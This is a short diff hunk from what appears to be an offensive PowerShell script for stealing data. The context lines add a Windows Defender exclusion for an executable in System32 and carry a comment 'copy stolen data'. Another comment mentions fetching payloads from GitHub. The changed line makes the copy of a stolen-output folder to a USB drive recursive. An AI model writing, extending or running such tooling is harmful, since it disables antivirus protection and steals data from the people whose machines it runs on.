@@ -9,7 +9,7 @@ Add-MpPreference -ExclusionPath "C:\Windows\System32\chromelevator_x64.exe"
 # create usbdrive variable
 $usbDrive = Get-Volume | Where-Object { $_.DriveType -eq 'Removable' }
 # copy stolen data
-Copy-Item -Path 'C:\Windows\System32\output' -Destination "$($usbDrive.DriveLetter):\" -Force
+Copy-Item -Path 'C:\Windows\System32\output' -Destination "$($usbDrive.DriveLetter):\" -Recurse -Force
 # inform user to remove usb
 echo "-------you can safely remove USB--------"
 # fetch payloads from github
